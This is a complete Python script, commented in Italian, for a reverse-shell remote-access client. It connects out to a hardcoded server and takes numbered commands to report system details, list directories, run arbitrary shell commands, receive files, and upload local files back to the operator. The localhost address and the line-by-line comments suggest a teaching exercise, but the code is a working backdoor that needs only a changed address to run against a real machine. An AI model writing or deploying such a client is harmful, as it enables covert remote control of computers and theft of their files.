import os  # Importa il modulo os per interagire con il sistema operativo
import platform  # Importa il modulo platform per ottenere informazioni sul sistema
import socket  # Importa il modulo socket per le comunicazioni di rete
import subprocess  # Importa il modulo subprocess per eseguire comandi di sistema


def connessione_al_server(indirizzo_server, porta_server):
    """Connette al server specificato."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crea un socket TCP/IP
    s.connect((indirizzo_server, porta_server))  # Connette al server specificato
    print(
        f"Connesso a {indirizzo_server}:{porta_server}"
    )  # Stampa un messaggio di conferma
    return s  # Restituisce l'oggetto socket connesso


def ricevi_dati(sock):
    """Riceve dati dal server."""
    return (
        sock.recv(1024).decode("utf-8").strip()
    )  # Riceve e decodifica i dati dal server


def invia_dati(sock, data):
    """Invia dati al server."""
    sock.sendall((data + "\n").encode("utf-8"))  # Codifica e invia i dati al server


def ottieni_info_sistema():
    """Ottiene informazioni sul sistema operativo."""
    return f"{platform.platform()} {platform.machine()}"  # Restituisce informazioni sul sistema operativo e l'architettura


def elenca_directory(directory):
    """Elenca i file nella directory specificata."""
    try:
        filelist = os.listdir(directory)  # Ottiene la lista dei file nella directory
        return "\n".join(
            filelist
        )  # Restituisce la lista dei file come stringa separata da nuove linee
    except Exception as e:
        return str(e)  # Restituisce il messaggio di errore in caso di eccezione


def esegui_comando(comando):
    """Esegue un comando di sistema."""
    try:
        result = subprocess.check_output(
            comando, shell=True, stderr=subprocess.STDOUT, text=True
        )  # Esegue il comando di sistema
        return result  # Restituisce l'output del comando
    except subprocess.CalledProcessError as e:
        return str(e)  # Restituisce il messaggio di errore in caso di eccezione


def scarica_file(sock, nome_file):
    """Scarica un file dal server."""
    try:
        with open(
            nome_file, "wb"
        ) as f:  # Apre il file in modalità binaria per scrittura
            while True:
                data = sock.recv(1024)  # Riceve i dati in blocchi di 1024 byte
                if b"END_OF_FILE" in data:
                    f.write(
                        data.replace(b"END_OF_FILE", b"")
                    )  # Rimuove il marcatore di fine file e scrive i dati
                    break  # Esce dal ciclo quando il marcatore di fine file è ricevuto
                f.write(data)  # Scrive i dati nel file
        return f"Scaricato {nome_file}"  # Restituisce un messaggio di conferma
    except Exception as e:
        return str(e)  # Restituisce il messaggio di errore in caso di eccezione


def carica_file(sock, nome_file):
    """Carica un file sul server."""
    try:
        with open(nome_file, "rb") as f:  # Apre il file in modalità binaria per lettura
            while True:
                data = f.read(1024)  # Legge i dati in blocchi di 1024 byte
                if not data:
                    sock.sendall(
                        b"END_OF_FILE"
                    )  # Invia il marcatore di fine file quando tutti i dati sono stati letti
                    break  # Esce dal ciclo quando il file è stato completamente letto
                sock.sendall(data)  # Invia i dati al server
        return f"Caricato {nome_file}"  # Restituisce un messaggio di conferma
    except Exception as e:
        return str(e)  # Restituisce il messaggio di errore in caso di eccezione


def main():
    SRV_ADDR = "127.0.0.1"  # Indirizzo IP del server a cui connettersi
    SRV_PORT = 12345  # Porta del server a cui connettersi

    s = connessione_al_server(SRV_ADDR, SRV_PORT)  # Stabilisce la connessione al server

    while True:
        try:
            data = ricevi_dati(s)  # Riceve il comando dal server
            if not data:
                continue  # Continua ad attendere comandi se non viene ricevuto nulla

            if data == "1":
                # Comando per ottenere informazioni sul sistema
                invia_dati(s, ottieni_info_sistema())
            elif data.startswith("2 "):
                # Comando per elencare i file in una directory
                dir_da_elencare = data[
                    2:
                ]  # Ottiene il percorso della directory dal comando
                invia_dati(s, elenca_directory(dir_da_elencare))
            elif data.startswith("3 "):
                # Comando per eseguire un comando di sistema
                comando = data[2:]  # Ottiene il comando di sistema dal comando
                invia_dati(s, esegui_comando(comando))
            elif data.startswith("4 "):
                # Comando per scaricare un file dal server
                nome_file = data[2:]  # Ottiene il nome del file dal comando
                invia_dati(s, scarica_file(s, nome_file))
            elif data.startswith("5 "):
                # Comando per caricare un file sul server
                nome_file = data[2:]  # Ottiene il nome del file dal comando
                invia_dati(s, carica_file(s, nome_file))
            elif data == "0":
                # Comando per chiudere la connessione
                s.close()  # Chiude la connessione
                break  # Esce dal ciclo principale
        except Exception as e:
            # Gestione degli errori
            invia_dati(s, f"Errore: {str(e)}")  # Invia il messaggio di errore al server
            s.close()  # Chiude la connessione in caso di errore
            break  # Esce dal ciclo principale


if __name__ == "__main__":
    main()  # Avvia la funzione principale
